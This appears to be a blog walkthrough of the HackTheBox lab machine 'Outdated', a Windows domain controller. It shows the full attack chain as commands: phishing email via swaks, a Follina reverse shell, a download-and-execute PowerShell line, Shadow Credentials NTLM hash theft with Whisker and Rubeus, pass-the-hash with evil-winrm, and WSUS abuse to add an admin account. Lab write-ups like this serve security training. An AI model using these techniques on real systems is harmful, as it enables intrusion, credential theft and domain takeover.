---
layout: post
title: HackTheBox - Outdated
category: HackTheBox
date: 2022-12-11 10:33 +0300
---

![Machine logo](/assets/hackthebox/outdated/Outdated.png)

# Configuration

If you're using your own machine like me, you have to access HTB network via `OpenVPN`:

```zsh
┌──(kali㉿workstation)-[~]
└─$ sudo openvpn lab_access_file.ovpn
```

You have to be accurate here, you must understand that your machine is becoming accessable for other users in the VPN network. So you have to protect yourself by setting up a strong password and turning off unused services on your machine. Make sure you have a strong system and others can't harm you.

It is very useful to append `/etc/hosts/` with ip address of the machine. It is useful to get subdomains and to not memorize the address every time.

```zsh
┌──(kali㉿workstation)-[~]
└─$ echo "10.10.11.175\toutdated.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

## Port scan

As always, we start with port scanning. I've updated my nmap bash script with a new feature - [nmap-bootstrap-xsl](https://github.com/honze-net/nmap-bootstrap-xsl). It is a tool to visualize your nmap scans. You have to insert a `--stylesheet` argument in your scan to use it. Also, I've added a `PN` toggle to my script. The script **fnmap.sh** is listed below

```bash
#!/bin/bash

if [[ $# != 1 ]]
then
    echo -e "\e[0;31m[!]\e[0m Not specified a host or incorrect use."
    exit 1
fi

echo "Treat all hosts as online -- skip host discovery (Y/N)?"
read answer
PN=""
if [ "$answer" != "${answer#[Yy]}" ] ; then
    PN="-Pn";
fi

ports=$(nmap -p- $PN --min-rate=500 $1 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
echo "Ports found:
$ports
"
filename="$1_scan" 
sudo nmap -p$ports -T4 $PN -A -oA $filename --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl $1
```

Here is classic in-terminal version:

```zsh
$ fnmap outdated.htb
# Nmap 7.93 scan initiated Thu Oct 27 15:26:42 2022 as: nmap -p25,53,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,9389,49667,49687,49688,49690,49915,49933,64998 -T4 -Pn -A -oA outdated.htb_scan --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl outdated.htb
Nmap scan report for outdated.htb (10.10.11.175)
Host is up (0.30s latency).

PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-10-27 19:26:49Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-10-27T19:28:34+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
|_ssl-date: 2022-10-27T19:28:32+00:00; +7h00m00s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
|_ssl-date: 2022-10-27T19:28:34+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
|_ssl-date: 2022-10-27T19:28:32+00:00; +7h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8530/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
8531/tcp  open  unknown
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49915/tcp open  msrpc         Microsoft Windows RPC
49933/tcp open  msrpc         Microsoft Windows RPC
64998/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-10-27T19:27:53
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   336.64 ms 10.10.16.1
2   438.79 ms outdated.htb (10.10.11.175)
```

And now let's see the browser version:

![Scan results in browser](/assets/hackthebox/outdated/nmap_scan_browser.png)

This tool is very useful when your scan gives so much ports and console output starts being hard to read. I enjoy this tool.

It is a `Windows server` machine with `Active Directory` (AD) enabled. There is an `smtp` server for e-mails on port 25 and a `Samba` (SMB) server. We can note that the `Windows Server Update Services` (WSUS) are enabled on the server, by default it has ports 8530/8531. The domain name is `outdated.htb` and the machine is a `Domain Controller` (DC), let's add it's address to our hosts file.

> 10.10.11.175    outdated.htb dc.outdated.htb

## Foothold

We noted that SMB is enabled on the server, let's try to access it's shares for some informaiton. You can use `smbclient` tool to make anonymous connection to the SMB server.

```zsh
smbclient -N -L \\\\dc.outdated.htb\\
```

![SMB shares](/assets/hackthebox/outdated/smb_shares.png)

`Shares` looks like non-default share here, and we can access it and download all files.

```zsh
smbclient -N \\\\dc.outdated.htb\\Shares\\
```

![PDF file in a share](/assets/hackthebox/outdated/pdf_in_share.png)

There is the only one file, a `PDF`.

![NOC_Reminder.pdf](/assets/hackthebox/outdated/attention_staff.png)

Here we can note 3 things: an e-mail address `itsupport@outdated.htb`, that e-mail is likely going to follow  the links sent by us and the list of `CVEs` that probably we can exploit here.

# user.txt

## Contact with itsupport

Our first step is to check our assumption that the itsupport will follow the links sent by us. We can use a tool `swaks` to send e-mails on mail servers. Also, I've added anew subdomain mail.outdated.htb in my hosts file here. To reach the goal we have to set up a web server.

> 10.10.11.175    outdated.htb dc.outdated.htb mail.outdated.htb

```zsh
swaks --to 'itsupport@outdated.htb' --from test@test.com --body 'http://<IP>/' --server mail.outdated.htb
```

![itsupport works](/assets/hackthebox/outdated/itsupport_works.png)

There it is, the itsupport works hard!

## Follina attack

The first vulnerability in the list presented in PDF is [Follina MS-MSDT attack vector](https://github.com/JohnHammond/msdt-follina). And there are a lot of exploits presented on GitHub, but this version has a reverse-shell feature included, so I've used it here.

VULN

To exploit it we have to clone the repository, start exploit script and send a message to itsupport. Then, we should get a reverse-shell connection.

```zsh
git clone https://github.com/JohnHammond/msdt-follina
cd msdt-follina
python3 follina.py --port 80 -i tun0 -r 4444
```

```zsh
swaks --to 'itsupport@outdated.htb' --from test@test.com --body 'http://<IP>/' --server mail.outdated.htb
```

![Got a btables user](/assets/hackthebox/outdated/got_btables_user.png)

And we got it. But there is no user flag in btables user's Desktop, so we need to get another user.

## Shadow credentials attack

It is an AD domain, so it is useful to upload a [SharpHound](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html) tool on the machine and enumerate `Access Control Lists` (ACLs) in the domain. I switched to powershell and used it's `Invoke-WebRequest` (iwr) cmdlet to get files on the machine.

```powershell
iwr -Uri http://<IP>:<PORT>/SharpHound.exe -OutFile SharpHound.exe
./SharpHound.exe -c All
```

To download files from the machine I'm going to use [uploadserver](https://pypi.org/project/uploadserver/) Python's library and a [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) powershell script.

```zsh
python3 -m uploadserver 8080
```

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/PSUpload.ps1')
Invoke-FileUpload -Uri http://<IP>:<PORT>/upload -File 20221027142207_BloodHound.zip
```

Now we have to set up a [BloodHound](https://github.com/BloodHoundAD/BloodHound) tool and import downloaded data.

We have to search our `btables` user, mark him as owned and select `Reachable High Value Targets` button. The BloodHound will make a nice graph to our next user, `sflowers`. 

![Bloodhound's path](/assets/hackthebox/outdated/bloodhound_path.png)

It is vulnerable to [Shadow Credentials attack](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab), because we can manipulate target's `msDS-KeyCredentialLink` attribute. 

To perform the attack, we do need 2 tools: [Whisker](https://github.com/eladshamir/Whisker) and [Rubeus](https://github.com/GhostPack/Rubeus). But I wasn't able to determine how to compile C# sources on the target machine, so I've decided to search more comfortable to use tools. And I found a [PowerSharpPack](https://github.com/S3cur3Th1sSh1t/PowerSharpPack) with the most used Windows/AD binaries in base64-compressed form, so the way was to decode base64 and decompress into binaries. I uploaded them on the host like before.

```zsh
cat Whisker.b64 | base64 -d > Whisker.gz
gzip -d Whisker.gz
cat Rubeus.b64 | base64 -d > Rubeus.gz
gzip -d Whisker.gz
```

First, we have to add our Shadow Credentials with `Whisker`. Then, we just copy and paste the given command to execute `Rubeus` and get a `NTLM` hash of sflowers user.

```powershell
./Whisker.exe add /target:sflowers
<Skipped Whisker output>

./Rubeus.exe asktgt /user:sflowers /certificate:<Base64 certificate> /password:"<Password>" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=sflowers 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'outdated.htb\sflowers'
[*] Using domain controller: 172.16.20.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

  <base64-cert>

  ServiceName              :  krbtgt/outdated.htb
  ServiceRealm             :  OUTDATED.HTB
  UserName                 :  sflowers
  UserRealm                :  OUTDATED.HTB
  StartTime                :  10/27/2022 3:21:21 AM
  EndTime                  :  10/27/2022 1:21:21 PM
  RenewTill                :  11/3/2022 3:21:21 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  SttuGPI9lPahkYurkK8WUA==
  ASREP (key)              :  C05C572660D227E2469ED5A20B141693

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : <sflowers NTLM hash>
```

We noted from BloodHound that sflowers is able to `PSRemote` in the DC. We can use [evil-winrm](https://github.com/Hackplayers/evil-winrm) tool with `-H` flag specified to get a session with NTLM hash of the user.

```zsh
evil-winrm -u sflowers -H <sflowers NTLM hash> -i dc.outdated.htb
```

![Got user flag!](/assets/hackthebox/outdated/user_flag.png)

# root.txt

## Exploring for WSUS

We noted that WSUS is enabled on the domain, so we can check if it is vulnerable. To do that we have a [SharpWSUS](https://github.com/nettitude/SharpWSUS) tool and a nice [cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#wsus-deployment) from PayloadAllTheThings. We upload the tool to the DC.

Our first step is to check if it is vulnerable for the attack. We can do it with `locate` parameter.

```powershell
./SharpWSUS.exe locate
```

![Locate vulnerable WSUS server](/assets/hackthebox/outdated/locate_wsus.png)

The attack requires a `Microsoft Signed` tool to be executed. Our choice here would be [PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec), we can search for it with powershell's `Get-ChildItem` cmdlet.

```powershell
gci -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include psexec*
```

![Found PsExec](/assets/hackthebox/outdated/found_psexec.png)

After that, we can verify if it is signed tool with powershell's [Get-AuthenticodeSignature] cmdlet.

```powershell
Get-AuthenticodeSignature -FilePath "C:\Users\sflowers\Desktop\PsExec64.exe"
```

![Verify psexec](/assets/hackthebox/outdated/verify_psexec.png)

Now we do have all parts of a puzzle, so let's exploit it!

## Exploit WSUS

I've had problems with powershell here, so I decided to use `cmd /c '<COMMAND>'` to make it work.

To start we should create a malicious patch. The command `create` is used here.

```powershell
cmd /c 'SharpWSUS.exe create /payload:"C:\Users\sflowers\Desktop\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add ^& net localgroup administrators WSUSDemo /add\"" /title:"WSUSDemo"'
```

![WSUS create](/assets/hackthebox/outdated/WSUS_create.png)

We should add a DC to a group, which will be affected by our patch. We have an `approve` command to do that.

```powershell
cmd /c 'SharpWSUS.exe approve /updateid:<updateid> /computername:dc.outdated.htb /groupname:"Group Name"'
```

Now, we have to wait a bit to get the update installed on the DC. There is a `check` command in SharpWSUS tool to check if the update is installed.

```powershell
cmd /c 'SharpWSUS.exe check /updateid:<updateid> /computername:dc.outdated.htb'
```

![WSUS check](/assets/hackthebox/outdated/WSUS_check.png)

Then, we can just WinRM into the dc with created WSUSDemo user.

```zsh
evil-winrm -u WSUSDemo -p 'Password123!' -i dc.outdated.htb
```

![Got root!](/assets/hackthebox/outdated/root_flag.png)

# Conclusion

There are a few Windows machines on the HackTheBox now, all latest releases was Linux and that's sad. But I think it has a reason...

The machine was nice, I've liked to learn about new attacks and vulnerabilities, like Follina. Thanks to the author for the machine!

Thank you for reading, I hope it was useful for you ❤️
